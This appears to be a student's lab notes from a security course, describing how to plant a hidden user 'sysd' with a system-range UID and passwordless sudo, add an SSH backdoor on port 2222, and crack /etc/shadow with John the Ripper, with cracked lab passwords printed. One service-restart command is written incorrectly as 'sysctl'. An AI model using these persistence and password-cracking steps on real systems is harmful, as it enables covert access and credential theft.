# Advanced Bash Scripting

### Shadow People
- Creating new secret user named `sysd`: `useradd sysd`
- Creating password for user: `sudo passwd sysd`
- Give secret user a sys ID < 1000: `sudo usermod -u 500 sysd`
- Give user the same GID: `sudo groupmod -g 500 sysd`
- Give user full sudo access w/ out password: `sudo visudo`
- Test sudo works w/out need for password:
```
sudo -l
sudo -lu sysd
sudo -v
sudo adduser Steph
sudo deluser Steph
```

### Smooth Sailing
- Edit `sshd_config` file:
![Diagram](https://github.com/aele1401/Linux/blob/main/Bash_Scripting/sshd_config.png)

### Testing Configuration Update
- Restart SSH service: `sudo sysctl restart ssh`
- Exit `root` user account: `exit`
- SSH into target using `sysd` account and port `2222`: `ssh sysd@192.168.1.105 -p 2222`
- Switch to `root` user: `sudo su root`

### Password Cracking
- SSH back to system with `sysd` account and port `2222`: `ssh sysd@192.168.1.105 -p 2222`
- Escalate privileges to `root` and use John-Ripper to crack the `/etc/shadow` directory:
    * `sudo su root`
    `john /etc/shadow`
    * Result:
    ```
    • sysadmin:passw0rd:18387:0:99999:7::: • student:Goodluck!:18387:0:99999:7::: • mitnik:trustno1:18387:0:99999:7::: • babbage:freedom:18387:0:99999:7::: • lovelace:dragon:18387:0:99999:7::: • stallman:computer:18387:0:99999:7::: • turing:lakers:18387:0:99999:7::: • sysd:password:18841:0:99999:7:::
    ```


